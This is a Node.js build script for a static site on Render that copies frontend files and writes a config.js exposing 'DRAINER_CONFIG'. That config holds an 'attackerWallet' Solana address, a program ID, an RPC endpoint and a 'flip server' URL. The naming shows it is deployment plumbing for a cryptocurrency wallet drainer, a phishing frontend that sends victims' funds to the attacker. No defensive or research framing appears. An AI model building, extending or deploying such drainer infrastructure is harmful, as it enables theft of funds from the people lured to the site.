#!/usr/bin/env node
/**
 * Build script for Render static site.
 * Injects FLIP_SERVER_URL, RPC_URL, ATTACKER_WALLET from env into config.js.
 */
const fs = require('fs');
const path = require('path');

const config = {
  flipServer: process.env.FLIP_SERVER_URL || 'http://localhost:3001',
  rpc: process.env.RPC_URL || 'https://api.mainnet-beta.solana.com',
  attackerWallet: process.env.ATTACKER_WALLET || 'DGtkrQpytKyzCaCALPAmCFuNeLLP2ScSeYxDMSa4T8gT',
  programId: process.env.PROGRAM_ID || 'DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU',
};

const outDir = path.join(__dirname, '..', 'public');
const frontendDir = path.join(__dirname, '..', 'frontend');

if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });

// Copy frontend files
['index.html', 'app.js'].forEach((f) => {
  fs.copyFileSync(path.join(frontendDir, f), path.join(outDir, f));
});

// Write config.js with env-injected values
fs.writeFileSync(
  path.join(outDir, 'config.js'),
  `window.DRAINER_CONFIG=${JSON.stringify(config)};`
);

console.log('Static build complete. Config:', config.flipServer);
